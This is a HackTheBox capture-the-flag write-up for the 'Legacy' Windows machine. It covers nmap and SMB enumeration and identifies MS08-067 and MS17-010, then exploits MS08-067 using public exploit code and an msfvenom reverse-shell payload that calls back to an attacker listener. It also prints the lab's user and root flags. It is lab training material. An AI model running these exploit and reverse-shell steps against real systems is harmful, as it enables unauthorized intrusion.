# legacy 

## Reconnaissance

### nmap (light)
```
nmap -sC -sV -oN nmap/egacy2 10.129.227.181
```

![](./IMG/0.png)
### nmap (heavy)
```
nmap -sV -T4 -p- -oN legacy_all 10.129.227.181
```

![](./IMG/1.png)


### NetBIOS and SMB

- Scan netbios service (port 139)
```
nmap -sV -T4 --script nbstat.nse -p139 -pN -n -oN legacy_nbt 10.129.227.181
```

![](./IMG/2.png)
- Scan SMB service by enum script (port 445)
```
nmap --script "safe or smb-enum-*" -p445 -oN legacy_smb 10.129.227.181
```
- Result first part 

![](./IMG/3.png)
- Second part, show some information about service

![](./IMG/4.png)
- Third part, it show some possible vuln

![](./IMG/5.png)
- Show the possible shares 

![](./IMG/6.png)
- Show some OS information

![](./IMG/7.png)
- Focus on scanning vuln 
```
nmap --script "smb-vuln-*" -p445 -oN legacy_smb3 10.129.227.181
```
- It shows the vulnerability for ms08-067

![](./IMG/8.png)
- The vulnerability for ms17-010

![](./IMG/9.png)
- Searchsploit for MS17-010

![](./IMG/10.png)
- Searchsploit for MS08-067

![](./IMG/11.png)
- crackmapexec command for smb service 
```
crackmapexec smb 10.129.227.181 -u '' -p '' --shares
```

![](./IMG/12.png)
- smbclient for null user

![](./IMG/13.png)
- smbclient without password

![](./IMG/14.png)
- smbclient 

![](./IMG/15.png)
#### Information from enum4linux-ng
- Target Information & Listener Scan on target

![](./IMG/16.png)
- NetBIOS Information

![](./IMG/17.png)
- SMB Dialect Check 

![](./IMG/18.png)
- Domain Infomation from SMB 

![](./IMG/19.png)
- RPC Related & Domain Information from RPC

![](./IMG/20.png)
- OS Information from RPC

![](./IMG/21.png)
- Users Information and Group Information from RPC 

![](./IMG/22.png)
- Shares ,Policy and Principle Information from RPC 

![](./IMG/23.png)

## Exploit 

- Research the exploit for ms08_067, the following information are very useful
- [(GITHUB)ms08_067 - Exploit Code - README](https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms08-067.md)
- [(GITHUB)ms08_067 - Exploit Code - 2](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)
- Generate shellcode by msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.145 LPORT=1337 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f c -a x86 --platfomr windows
```

![](./IMG/24.png)
- Copy the shellcode to replace the one in``` ms08_067.py```

![](./IMG/25.png)
- Execute the exploit code 

![](./IMG/26.png)

![](./IMG/27.png)
- Check the listener, it will get the reverse shell

![](./IMG/28.png)
- user flag
```
e69af0e4f443de7e36876fda4ec7644f
```
![](./IMG/29.png)
- root flag
```
993442d258b0e0ec917cae9e695d5713
```
![](./IMG/30.png)

## Second Method 

> From others writeup and the nmap result, this lab also can be exploited by ms17_010

## Reference 

- [(HackTrick)SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [(HackTrick)SMB-2](https://hacktricks.boitatech.com.br/pentesting/pentesting-smb)
- [(HackTrick)MSRPC](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
- [(HackTrick)MSRPC-2](https://hacktricks.boitatech.com.br/pentesting/135-pentesting-msrpc)
- [(GITHUB)ms08_067 - Exploit Code](https://github.com/andyacer/ms08_067)
- [(GITHUB)ms08_067 - Exploit Code - README](https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms08-067.md)
- [(GITHUB)ms08_067 - Exploit Code - 2](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)
- [Metasploit Basics for Beginners – Exploiting Windows XP (MS08–067) with Metasploit (Kali Linux) – Part 1](https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/)
- [Exploit Eternal Blue (MS17–010) for Windows XP with custom payload](https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-windows-xp-with-custom-payload-fabbbbeb692f)
- [(GITHUB)ms17-010 - Exploit Code - 1](https://github.com/worawit/MS17-010)
- [(GITHUB)ms17-010 - Exploit Code - 2](https://github.com/a6avind/MS17-010)
- [(GIThUB)ms17-010 - Exploit Code - 3](https://github.com/3ndG4me/AutoBlue-MS17-010)
- [Windows Privilege Escalation Fundamentals](https://fuzzysecurity.com/tutorials/16.html)
- [(HackTrick)Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)


###### tags: `HackTheBox` `Easy` `Windows` `ms08_067` `ms17_010` `SMB` `445`
